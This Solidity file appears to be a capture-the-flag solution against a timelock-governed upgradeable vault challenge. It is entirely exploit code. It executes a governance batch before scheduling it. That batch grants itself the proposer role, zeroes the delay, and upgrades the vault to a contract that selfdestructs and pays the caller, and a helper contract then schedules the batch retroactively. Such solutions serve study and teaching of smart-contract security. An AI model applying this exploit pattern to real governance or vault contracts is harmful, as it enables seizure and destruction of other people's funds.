// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./TheKingIsDeadLongLiveTheKing.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Boom is UUPSUpgradeable {
    function explode() public {
        selfdestruct(payable(msg.sender));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract Proposer {
    GovernanceTimelock gov;
    KingVault ins;
    address boom;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        GovernanceTimelock _gov,
        KingVault _ins,
        address _boom
    ) {
        gov = _gov;
        ins = _ins;
        boom = _boom;
    }

    function propose() public {
        bytes memory GRANT_ROLE = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );
        bytes memory UPDATE_DELAY = abi.encodeWithSignature(
            "updateDelay(uint64)",
            0
        );
        // upgradeToAndCall(address newImplementation, bytes memory data)
        bytes memory UPGRADE_TO_AND_CALL = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            boom,
            abi.encodeWithSignature("explode()")
        );
        bytes memory SCHEDULE_BATCH = abi.encodeWithSignature("propose()");

        address[] memory targets = new address[](4);
        targets[0] = address(gov);
        targets[1] = address(gov);
        targets[2] = address(ins);
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory datas = new bytes[](4);
        datas[0] = GRANT_ROLE;
        datas[1] = UPDATE_DELAY;
        datas[2] = UPGRADE_TO_AND_CALL;
        datas[3] = SCHEDULE_BATCH;

        bytes32 salt = bytes32(0);
        gov.schedule(targets, values, datas, salt);
    }
}

contract Solve {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        GovernanceTimelock gov,
        KingVault ins,
        address proposer,
        address boom
    ) {
        bytes memory GRANT_ROLE = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            proposer
        );
        bytes memory UPDATE_DELAY = abi.encodeWithSignature(
            "updateDelay(uint64)",
            0
        );
        // upgradeToAndCall(address newImplementation, bytes memory data)
        bytes memory UPGRADE_TO_AND_CALL = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            boom,
            abi.encodeWithSignature("explode()")
        );
        bytes memory SCHEDULE_BATCH = abi.encodeWithSignature("propose()");

        address[] memory targets = new address[](4);
        targets[0] = address(gov);
        targets[1] = address(gov);
        targets[2] = address(ins);
        targets[3] = proposer;

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory datas = new bytes[](4);
        datas[0] = GRANT_ROLE;
        datas[1] = UPDATE_DELAY;
        datas[2] = UPGRADE_TO_AND_CALL;
        datas[3] = SCHEDULE_BATCH;

        bytes32 salt = bytes32(0);
        gov.execute(targets, values, datas, salt);
    }
}
